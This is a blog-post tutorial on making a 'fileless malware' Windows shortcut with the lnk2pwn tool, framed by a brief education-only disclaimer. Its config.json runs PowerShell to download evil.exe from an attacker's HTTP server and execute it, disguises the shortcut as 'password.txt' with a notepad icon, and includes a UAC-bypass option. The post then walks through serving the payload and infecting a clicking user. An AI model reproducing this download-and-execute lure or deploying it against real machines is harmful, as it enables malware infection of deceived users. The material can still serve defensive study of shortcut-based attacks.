---
title: "Create malicious Shortcut .LNK"
date: "2020-02-11"
layout: single
tags:
- Malicious
categories:
- Blog-post
---

Hey, everyone. Let's create some fileless malware using shortcut (.lnk). 

Don't do bad things haa, Allah marah! This is for education and research purpose only.

## Malicious Shortcut(.lnk) Generator

So, a script name [Lnk2Pwn](https://github.com/tommelo/lnk2pwn) made by Tommello will help us generate malicious shortcut .lnk

For installation, lnk2pwn requires **python2.7** and **wine** to create a Windows shortcut:

    sudo apt-get install python2.7
    sudo apt-get install wine

You can get the lastest version by clonning this repository:

    git clone https://github.com/tommelo/lnk2pwn.git

In lnk2pwn directory, edit config.json. The project contains a template file called config.json that defines the attributes of the .lnk file:

    {
        "shortcut": {
            "target_path": "C:\\Windows\\System32\\cmd.exe",
            "working_dir": "C:\\Windows\\System32",
            "arguments": "/c powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.83.128:8000/evil.exe', '%temp%\evil.exe'); Start-Process -Filepath '%temp%\evil.exe'"",
            "icon_path": "C:\\Windows\\System32\\notepad.exe",
            "icon_index": null,
            "window_style": "MINIMIZED",
            "description": "Password",
            "fake_extension": ".txt",
            "file_name_prefix": "password"
        },
    
        "elevated_uac": {
            "file_name": "uac_bypass.vbs",
            "cmd": "cmd.exe"
        }
    }

So, basically the `arguments` part will execute Powershell (PS) command that tell PS to download `evil.exe` and put the `evil.exe` into temp (%temp%) folder. After semicolon, we tell the PS to start/execute our `evil.exe`.

Now, run this line to generate our malicious .lnk:

    python lnk2pwn.py -c config.json -o [destination]

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/mallnk/1.PNG)

Our lnk file now has been generated. Let's put this malicious .lnk file into our target machine.

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/mallnk/2.PNG)

Looks legit right?

## Open our HTTP server
Setup our HTTP server so that evil.exe can be download from HTTP link we give in our PS line (`http://192.168.83.128:8000/evil.exe`)

    python -m SimpleHTTPServer

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/mallnk/3.PNG)

## Pwned by a Shortcut

So, if a user click the `password.txt`(.lnk), they will be infected. Let's wait for a couple of seconds for our evil.exe to be downloaded. And Hooray 🎉, our `evil.exe` is executed!

![enter image description here](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/mallnk/3.gif)
